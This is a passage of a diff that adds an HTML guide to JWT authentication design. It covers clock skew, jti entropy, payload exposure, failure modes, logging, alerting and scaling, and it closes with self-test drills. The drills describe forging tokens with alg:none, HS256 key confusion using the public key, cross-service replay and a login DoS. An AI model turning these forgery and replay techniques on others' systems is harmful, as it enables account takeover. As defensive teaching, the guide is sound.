+    <span class="panel-label">Clock skew is a stolen-token life extension</span>
+    <p>A validator with five minutes of skew tolerance accepts every token for five minutes past its
+      stated expiry. That is a 33% extension of a fifteen-minute token, applied uniformly to
+      legitimate and stolen tokens alike. <strong>Cap tolerance at 60 seconds</strong>, monitor NTP drift, and alert
+      if any server clock moves more than a second out.</p>
+  </div>
+
+  <div class="panel panel--pitfall">
+    <span class="panel-label">Low-entropy <code>jti</code> breaks the blacklist</span>
+    <p>If <code>jti</code> is an 8-byte value, a counter, or derived from user id plus timestamp, collisions are
+      reachable and in some cases predictable. A collision means one user's blacklist entry blocks a
+      different user's perfectly valid token, and a predictable scheme means an attacker can
+      pre-compute one. <strong>Use UUIDv4</strong>: 128 bits of randomness puts the birthday bound around 2⁶⁴
+      tokens, which is not a number you will reach.</p>
+  </div>
+
+  <h3>Payload disclosure</h3>
+<pre><code>$ echo "eyJzdWIiOiIxMjMiLCJzc24iOiIxMjMtNDUtNjc4OSJ9" | base64 -d
+{"sub":"123","<u>ssn":"123-45-6789</u>","salary":95000,
+ "<u>internal_db":"postgres.internal.example.com:5432</u>"}
+
+<i># no key required. base64url is encoding.</i>
+<i># the signature proves nobody CHANGED it, not that nobody can READ it.</i></code></pre>
+  <p>The correct mental model is a <strong>signed postcard</strong>. Put in it only what authorization needs:
+    <code>sub</code>, <code>roles</code>, <code>scope</code> and the standard claims. JWE exists for genuine payload confidentiality
+    and brings enough key-management complexity that it is rarely the right answer.</p>
+</section>
+
+<!-- ============================================ 11 -->
+<section class="part" id="s11">
+  <div class="part-head">
+    <span class="part-num">11 — Failure modes</span>
+    <h2>Failure modes</h2>
+  </div>
+
+  <div class="duo">
+    <div class="panel panel--threat">
+      <span class="panel-label">Argon2 saturates the CPU</span>
+      <p>One core handles roughly three logins per second at 300 ms each. A four-core instance handles
+        twelve. A login spike therefore starves everything else on the process, including health
+        checks, which causes the load balancer to remove healthy instances and make it worse.</p>
+      <p><strong>Fix:</strong> isolate hashing in a fixed thread pool, apply backpressure by rejecting when the
+        queue is deep, and autoscale on CPU with headroom at around 60%.</p>
+    </div>
+    <div class="panel panel--threat">
+      <span class="panel-label">JWKS endpoint unavailable</span>
+      <p>If a resource API's cache expires while the auth service is down, <strong>every authenticated
+        request fails</strong>. A cache TTL has become a total outage.</p>
+      <p><strong>Fix:</strong> long cache, proactive refresh, jittered expiry, never evict without a replacement,
+        and a static fallback copy.</p>
+    </div>
+  </div>
+
+  <div class="panel panel--pitfall">
+    <span class="panel-label">Redis running out of memory</span>
+    <p>Both the blacklist and the rate-limit store live in Redis. With <code>maxmemory-policy: noeviction</code>
+      all writes fail, and depending on your implementation the rate limiter then fails open or
+      closed — you should know which. Use <code>volatile-lru</code> so keys with a TTL are evicted first, and
+      alert at 80% of capacity.</p>
+    <p>The blacklist has a natural bound worth knowing: with TTLs equal to remaining token life, its
+      maximum size is roughly <strong>one entry per concurrent user</strong>. An attacker forcing mass logouts
+      makes users re-authenticate, which is disruptive, but it does not make the list unbounded.</p>
+  </div>
+
+  <div class="tbl">
+    <table>
+      <thead><tr><th>Misconfiguration</th><th>Impact</th><th>Correct setting</th></tr></thead>
+      <tbody>
+        <tr><td><code>alg: none</code> accepted</td><td>Total forgery</td><td>Allowlist <code>["RS256"]</code> in the verifier</td></tr>
+        <tr><td>HS256 with a weak secret</td><td>Offline cracking, then total forgery</td><td>RS256, or 256 random bits</td></tr>
+        <tr><td>No <code>aud</code> validation</td><td>Cross-service token reuse</td><td>Assert this service is in <code>aud</code></td></tr>
+        <tr><td>No <code>iss</code> validation</td><td>Tokens from other issuers accepted</td><td>Exact string match</td></tr>
+        <tr><td>Clock skew &gt; 60 s</td><td>Every token lives longer</td><td>60 seconds maximum</td></tr>
+        <tr><td>Refresh token in <code>localStorage</code></td><td>Any XSS gets 30 days of access</td><td><code>HttpOnly; Secure; SameSite=Strict</code></td></tr>
+        <tr><td>PII in the payload</td><td>Readable by anyone holding the token</td><td>Authorization claims only</td></tr>
+        <tr><td>No password length cap</td><td>KDF denial of service</td><td>Reject over 1024 bytes before hashing</td></tr>
+        <tr><td>Access token TTL &gt; 1 hour</td><td>Stolen tokens live too long</td><td>15 minutes</td></tr>
+        <tr><td>No <code>jti</code></td><td>Cannot revoke a single token</td><td>UUIDv4, always</td></tr>
+        <tr><td>Public key cached without <code>kid</code></td><td>Rotation breaks every validation</td><td>Cache by <code>kid</code>, refresh on unknown</td></tr>
+        <tr><td>Full JWT in access logs</td><td>Credentials in your log store</td><td>Log <code>jti</code> or a hash, never the token</td></tr>
+      </tbody>
+    </table>
+  </div>
+</section>
+
+<!-- ============================================ 12 -->
+<section class="part" id="s12">
+  <div class="part-head">
+    <span class="part-num">12 — Operations</span>
+    <h2>Observability</h2>
+  </div>
+
+<pre><code>{ "event_type": "auth.login.success",
+  "request_id": "req-…", "trace_id": "trace-…",
+  "user_id": "user-uuid-…",
+  "ip_hash": "sha256:a1b2…", "ip_geo": "US-CA",   <i># hashed, plus coarse geo</i>
+  "ua_hash": "sha256:d4e5…",
+  "<b>jti</b>": "jwt-uuid-…",                            <i># correlates with resource API logs</i>
+  "duration_ms": 312, "argon2_duration_ms": 298,
+  "outcome": "success" }</code></pre>
+
+  <div class="panel panel--pitfall">
+    <span class="panel-label">Never in logs</span>
+    <p>JWT values and refresh token values — they are credentials, not identifiers. Passwords,
+      including failed attempts. The RSA private key. Full IP addresses, which are PII in several
+      jurisdictions, so hash them and keep coarse geography. Full email addresses in high-volume logs.
+      <strong>Log the <code>jti</code>, not the token</strong>: it gives you every correlation you actually need and is
+      useless to anyone who steals the log.</p>
+  </div>
+
+  <div class="tbl">
+    <table>
+      <thead><tr><th>Condition</th><th>Severity</th><th>What it means</th></tr></thead>
+      <tbody>
+        <tr><td><code>alg_error</code> &gt; 0</td><td><span class="tag tag--bad">critical</span></td><td>Algorithm confusion attempt. Baseline is zero.</td></tr>
+        <tr><td><code>reuse_detected</code> &gt; 0</td><td><span class="tag tag--bad">critical</span></td><td>Refresh token theft, with high confidence</td></tr>
+        <tr><td>Login failures &gt; 100/min for one email</td><td><span class="tag tag--bad">high</span></td><td>Targeted credential stuffing</td></tr>
+        <tr><td>Login failures &gt; 10,000/min globally</td><td><span class="tag tag--bad">critical</span></td><td>Distributed campaign</td></tr>
+        <tr><td>Argon2 p99 &gt; 1 s</td><td><span class="tag tag--bad">high</span></td><td>Long-password DoS or CPU saturation</td></tr>
+        <tr><td><code>jwks_cache_age</code> &gt; 24 h</td><td><span class="tag tag--bad">high</span></td><td>Stale keys; rotation will break you</td></tr>
+        <tr><td><code>private_key_age_days</code> &gt; 30</td><td><span class="tag tag--mid">medium</span></td><td>Rotation overdue</td></tr>
+        <tr><td>New <code>jti</code> issued that is already blacklisted</td><td><span class="tag tag--mid">medium</span></td><td>Entropy problem in <code>jti</code> generation</td></tr>
+        <tr><td>Login failures for unknown emails, low volume</td><td><span class="tag tag--neu">no alert</span></td><td>Ordinary background probing</td></tr>
+      </tbody>
+    </table>
+  </div>
+
+<pre><code>login_request                        [350 ms]
+├── rate_limit_check                 [2 ms]   <i># runs FIRST, before any hashing</i>
+├── db.query user_by_email           [5 ms]
+├── <b>crypto.argon2_verify           [295 ms]</b>  <i># 84% of the request, by design</i>
+├── crypto.jwt_sign                  [3 ms]
+├── db.insert refresh_token          [8 ms]
+└── event.publish audit_log          [0.5 ms] <i># async, non-blocking</i></code></pre>
+</section>
+
+<!-- ============================================ 13 -->
+<section class="part" id="s13">
+  <div class="part-head">
+    <span class="part-num">13 — Scaling</span>
+    <h2>Scaling and drills</h2>
+  </div>
+
+  <div class="defs">
+    <div><span class="dt">Argon2 on login</span><span class="dd">The dominant bottleneck, deliberately. ~3 logins/sec/core. Scale the auth service horizontally and isolate hashing in its own thread pool so a login spike does not starve refresh and logout.</span></div>
+    <div><span class="dt">Refresh token writes</span><span class="dd">Every login writes; every refresh rotates. A single Postgres primary handles roughly 10k writes/sec, so this is rarely the limit. <b>Partition by <code>expires_at</code></b> so cleanup is a partition drop rather than a bulk DELETE.</span></div>
+    <div><span class="dt">Read replicas</span><span class="dd">User lookups by email can go to replicas. <b>Refresh token reads and writes must go to the primary</b> — a stale read of a just-revoked token defeats the reuse detector.</span></div>
+    <div><span class="dt">Redis</span><span class="dd">Single-threaded per shard at roughly 100k ops/sec. Vertical first, cluster when the ceiling is real. Only needed on the hot path if you blacklist.</span></div>
+    <div><span class="dt">Resource APIs</span><span class="dd">Scale freely. Validation is pure CPU against a cached public key, with no shared state whatsoever. This is the property you bought.</span></div>
+  </div>
+
+  <div class="tbl">
+    <table>
+      <thead><tr><th>Decision</th><th>Buys you</th><th>Costs you</th></tr></thead>
+      <tbody>
+        <tr><td>RS256 over HS256</td><td>No key distribution problem; resource APIs cannot mint tokens</td><td>JWKS infrastructure and rotation choreography</td></tr>
+        <tr><td>15-minute access tokens</td><td>Small theft window</td><td>Silent-refresh complexity in every client</td></tr>
+        <tr><td>Blacklist on <code>jti</code></td><td>Real logout</td><td>A Redis call on every request, and a new single point of failure</td></tr>
+        <tr><td>Argon2id</td><td>Brute-force resistance</td><td>CPU cost that dominates login and drives autoscaling</td></tr>
+        <tr><td>Refresh rotation with families</td><td>Theft becomes a high-confidence alert</td><td>Grace-period handling for crashed clients</td></tr>
+        <tr><td>HttpOnly cookie for refresh</td><td>XSS cannot reach it</td><td>Same-origin constraints on the SPA</td></tr>
+      </tbody>
+    </table>
+  </div>
+
+  <h3>Drills</h3>
+  <ol>
+    <li><strong>Forge with <code>alg: none</code>.</strong> Strip the signature, set the algorithm, present it. Then try the
+      HS256 variant using the public key from your own JWKS endpoint as the secret. Both must fail.</li>
+    <li><strong>Trigger reuse detection.</strong> Refresh once, then present the old token. Confirm the entire
+      family is revoked and that the event fires an alert.</li>
+    <li><strong>Test the grace period.</strong> Simulate a client that receives a new token and crashes before
+      storing it. Confirm you do not lock out a legitimate user.</li>
+    <li><strong>Cross-service replay.</strong> Take a token minted for service A and present it to service B. If B
+      accepts it, you have found the most common missing check in the estate.</li>
+    <li><strong>Rotate a key with traffic flowing.</strong> Follow all five steps, then deliberately skip step 4 in
+      staging and measure how many requests fail.</li>
+    <li><strong>DoS your own login.</strong> Send a 1 MB password. Confirm you are rejected before any hashing
+      happens, and watch memory while you do it.</li>
+    <li><strong>Kill the JWKS endpoint</strong> and let a resource API's cache expire. Whatever happens next is
+      your real availability posture.</li>
+    <li><strong>Grep your logs</strong> for <code>eyJ</code>, which is the base64 prefix of every JWT header. Any hit is a
+      credential sitting in your log store.</li>
+  </ol>
+</section>
+
+</main>
+</div>
+
+<footer class="colophon">
+  <p><strong>How to use this.</strong> Sections 1 to 3 are the mechanism. Sections 4 to 8 are the design
+    decisions, all of which are trades between revocation speed and statelessness. Sections 9 and 10
+    are the attacks, which divide cleanly into forging tokens and stealing them. Sections 11 to 13 are
+    operations.</p>
+  <p><strong>The one idea to keep.</strong> A JWT is a snapshot of authorization taken at issue time and trusted
+    until expiry. Everything difficult about this architecture follows from that one sentence: stale
+    roles, unreliable logout, the blacklist that undoes your statelessness, and the fifteen-minute
+    lifetime chosen to make all of it survivable. <b>Choose the lifetime first, and the rest of the
+    design follows.</b></p>
+</footer>
+</div>
